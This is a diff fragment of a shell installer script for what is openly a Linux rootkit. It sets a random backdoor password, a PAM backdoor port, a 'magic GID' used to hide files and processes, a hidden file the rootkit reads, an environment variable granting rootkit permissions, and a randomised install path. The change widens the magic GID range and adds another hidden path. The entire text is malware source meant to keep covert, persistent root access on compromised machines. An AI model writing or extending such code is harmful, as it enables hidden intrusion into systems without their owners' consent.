@@ -28,8 +28,9 @@ fi
 [ -z $BD_PWD ] && BD_PWD=`random 'a-zA-Z0-9' 8`
 [ -z $PAM_PORT ] && PAM_PORT=`random '1-9' 4`
 
-[ -z $MAGIC_GID ] && MAGIC_GID=`random '1-5' 5`               # default GID used to hide things.
+[ -z $MAGIC_GID ] && MAGIC_GID=`random '1-9' 6`               # default GID used to hide things.
 [ -z $GID_PATH ] && GID_PATH="`random_path $DIRDEPTH`"        # file the rootkit reads for the magic GID.
+[ -z $GIDTIME_PATH ] && GIDTIME_PATH="`random_path $DIRDEPTH`"
 [ -z $BD_VAR ] && BD_VAR="`random 'A-Z' 9`"                   # environment variable to grant rk perms.
 
 [ -z $INSTALL_DIR ] && INSTALL_DIR="`random_path $DIRDEPTH`"  # installation directory.
